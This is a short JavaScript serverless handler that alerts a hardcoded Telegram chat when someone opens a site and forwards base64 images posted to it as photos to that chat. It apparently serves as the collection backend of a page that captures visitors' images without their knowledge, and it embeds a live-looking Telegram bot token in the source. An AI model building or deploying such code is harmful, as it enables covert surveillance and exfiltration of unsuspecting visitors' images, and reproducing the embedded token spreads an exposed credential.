import fetch from 'node-fetch';
import FormData from 'form-data';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const BOT_TOKEN = '8098677151:AAHw3ofWspeagUJWjWejk91whH9z9y_PoYA';
    const CHAT_ID = '802683583';

    try {
        // ✅ If just notify
        if (req.body.notify) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: '✅ Someone opened the site!' })
            });
            return res.status(200).json({ ok: true, message: 'Notify sent' });
        }

        // ✅ If sending photo
        const { image } = req.body;
        if (!image) return res.status(400).json({ message: 'No image received' });

        const buffer = Buffer.from(image.split(',')[1], 'base64');
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', buffer, 'photo.jpg');

        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const data = await tgRes.json();
        return res.status(200).json({ ok: true, telegram: data });

    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return res.status(500).json({ ok: false, error: error.message });
    }
}
